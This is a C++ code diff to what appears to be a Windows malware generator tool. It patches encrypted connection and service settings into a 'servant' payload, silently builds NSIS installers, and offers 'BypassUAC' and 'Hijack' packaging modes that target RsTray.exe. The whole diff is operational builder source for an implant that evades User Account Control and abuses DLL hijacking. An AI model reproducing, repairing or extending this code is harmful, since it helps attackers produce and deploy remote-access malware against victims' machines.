@@ -65,7 +65,7 @@ static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, D
 	LPBYTE pTest = pBase;
 	for (DWORD i = 0; i < dwSize - dwDataSize; i++, pTest++)
 	{
-		if (*(LPDWORD)pTest == dwFlag && *((LPDWORD)pTest + 1) == 0)
+		if (*(LPDWORD)pTest == dwFlag/* && *((LPDWORD)pTest + 1) == 0*/)
 		{
 			count++;
 		}
@@ -79,12 +79,12 @@ static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, D
 
 	for (DWORD i = 0; i < dwSize - dwDataSize; i++, pBase++)
 	{
-		if (*(LPDWORD)pBase == dwFlag && *((LPDWORD)pBase + 1) == 0)
+		if (*(LPDWORD)pBase == dwFlag /*&& *((LPDWORD)pBase + 1) == 0*/)
 		{
-			memcpy(pBase, pData, dwDataSize);
+			memcpy(pBase + sizeof(DWORD), pData + sizeof(DWORD), dwDataSize - sizeof(DWORD));
  			if (bEncrypt)
  			{
- 				XorFibonacciCrypt(pBase, dwDataSize, pBase, factor1, factor2);
+ 				XorFibonacciCrypt(pBase + sizeof(DWORD), dwDataSize - sizeof(DWORD), pBase + sizeof(DWORD), factor1, factor2);
  			}
 			return TRUE;
 		}
@@ -414,7 +414,6 @@ END:
 BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 {
 	CString strSavePath;
-	CString strServantPath;
 	CString strInstPath;
 	CString strNSIFilePath;
 	CString strTempServant;
@@ -441,27 +440,11 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	strNSHFile.Format(_T("%sLogicLib.nsh"), GetModFilePath(NULL));
 	strNSHTempFile.Format(_T("%s\\LogicLib.nsh"), strSavePath);
 
-	
-	strServantPath.Format(_T("%s%s"), szPath, SERVANT_FILE);
 	strTempServant.Format(_T("%s\\%s"), strSavePath, SERVANT_FILE);
 	strNSIFilePath.Format(_T("%s\\%s"), strSavePath, NSI_FILE);
 
 	CHAR szInstallPath[MAX_PATH] = {0};
 	lstrcpyA(szInstallPath, CStringA(service.szInstalPath));
-
-	//准备文件
-// 	::DeleteFile(strNSHTempFile);
-// 	if(!CopyFile(strNSHFile,strNSHTempFile,TRUE))
-// 	{
-// 		strError = _T("拷贝文件失败！");
-// 		return FALSE;
-// 	}
-	::DeleteFile(strTempServant);
-	if(!CopyFile(strServantPath,strTempServant,TRUE))
-	{
-		strError = _T("拷贝文件失败！");
-		return FALSE;
-	}
 
 	HANDLE hFile = CreateFile(strTempServant,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if (hFile == INVALID_HANDLE_VALUE)
@@ -531,17 +514,25 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 		return FALSE;
 	}
 
+	strFullCmd += "\"";
+
 	strFullCmd+=szPath;
 	strFullCmd+="\\makensis.exe";
+
+	strFullCmd += "\"";
+
 	strCmd = CString(strFullCmd);
 	SHELLEXECUTEINFO execInfo; 
 	memset(&execInfo, 0, sizeof(SHELLEXECUTEINFO)); 
+
+	strNSIFilePath  = CString("\"") + strNSIFilePath;
+	strNSIFilePath += CString("\"");
 
 	execInfo.cbSize = sizeof(SHELLEXECUTEINFO); 
 	execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
 	execInfo.lpVerb = _T("open"); 
 	execInfo.lpFile = strCmd; 
-	execInfo.lpParameters = strNSIFilePath;
+	execInfo.lpParameters =  strNSIFilePath;
 	execInfo.nShow = SW_HIDE; 
 	ShellExecuteEx(&execInfo); 
 
@@ -583,7 +574,7 @@ BOOL MakeCab(LPCTSTR lpsrcFilePath,LPCTSTR lpdesFilePath)
 	execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
 	execInfo.lpVerb = _T("open"); 
 	execInfo.lpFile = _T("makecab.exe"); 
-	execInfo.lpParameters = strParameters;
+	execInfo.lpParameters = CString("\"") + strParameters + CString("\"");
 	execInfo.nShow = SW_HIDE; 
 	ShellExecuteEx(&execInfo); 
 
@@ -966,6 +957,9 @@ void CGeneratorDlg::OnBnClickedButtonBingo()
 	else if (bPassUAC) generateConfig.packetType = PACKET_TYPE_PASSUAC;
 	else if (bHijack) generateConfig.packetType = PACKET_TYPE_HIJACK;
 
+	Config_Info.nFlag = CONNECT_FLAG;
+	Service_Info.nFlag = SERVICE_FLAG;
+
 	CString strError;
 	if (bCarrier && WriteCarrier(Config_Info,Service_Info,strError))
 	{
@@ -974,23 +968,23 @@ void CGeneratorDlg::OnBnClickedButtonBingo()
 	else if (bSetup && WriteSetup(Config_Info,Service_Info,strError))
 	{
 		MessageBox(_T("Setup生成成功！"));
-		CString exploreParameter;
-		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
-		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
+// 		CString exploreParameter;
+// 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
+// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 	}
 	else if (bPassUAC && WriteBypassUAC(Config_Info,Service_Info,strError))
 	{
 		MessageBox(L"BypassUAC生成成功！");
-		CString exploreParameter;
-		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
-		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
+// 		CString exploreParameter;
+// 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
+// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 	}
 	else if(bHijack && WriteHijack(Config_Info,Service_Info,strError))
 	{
 		MessageBox(_T("Hijack生成成功！"));
-		CString exploreParameter;
-		exploreParameter.Format(_T("/e,/select,\"%shijack\\RsTray.exe\""), GetModFilePath(NULL));
-		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
+// 		CString exploreParameter;
+// 		exploreParameter.Format(_T("/e,/select,\"%shijack\\RsTray.exe\""), GetModFilePath(NULL));
+// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
 	}
 	else 
 	{
